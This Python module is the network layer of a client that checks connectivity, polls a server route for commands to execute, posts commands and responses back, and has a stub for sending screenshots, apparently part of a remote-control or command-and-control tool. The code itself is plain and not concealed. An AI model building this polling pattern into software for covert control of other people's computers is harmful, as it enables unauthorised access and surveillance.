# -*- coding: utf-8 -*-
import requests
import configuration

"""
Communication Facade
Provides functions to communicate with the server
""" 

def is_connected ( ):
    """
    Executes a network request to the server to check for internet connection
    :return: True if connected
    """ 
    
    try:
        requests.get( configuration.get_server_address() )
    except requests.RequestException:
        return False

    return True

def send_screenshot ( ):
    """
    Sends a screenshot to the server
    :return: True if sent, False otherwise
    """ 
    pass

def get_command ( ):
    """
    Executes a network request to command route to retrieve a command
    :return: Command to execute or NONE
    """ 

    try:
        return requests.get(configuration.get_command_route()).text
    except:
        return "NONE"

def set_command ( data ):
    """
    Executes a network request to command route to set the command
    :return: True if sent, False otherwise
    """ 
    
    try:
        if ( requests.post(configuration.get_command_route(), data).status_code == requests.codes.ok ):
            return True
        return False
    except:
        return False

def set_response ( data ):
    """
    Executes a network request to response route to set a response
    :return: True if set, False otherwise
    """ 
    
    try:
        if ( requests.post(configuration.get_response_route(), data).status_code == requests.codes.ok ):
            empty_command ( )
            return True
        return False
    except:
        return False

def get_response ( ):
    """
    Executes a network request to response route to retrieve a command
    :return: Response received or NONE
    """ 

    try:
        return requests.get(configuration.get_response_route()).text
    except:
        return "NONE"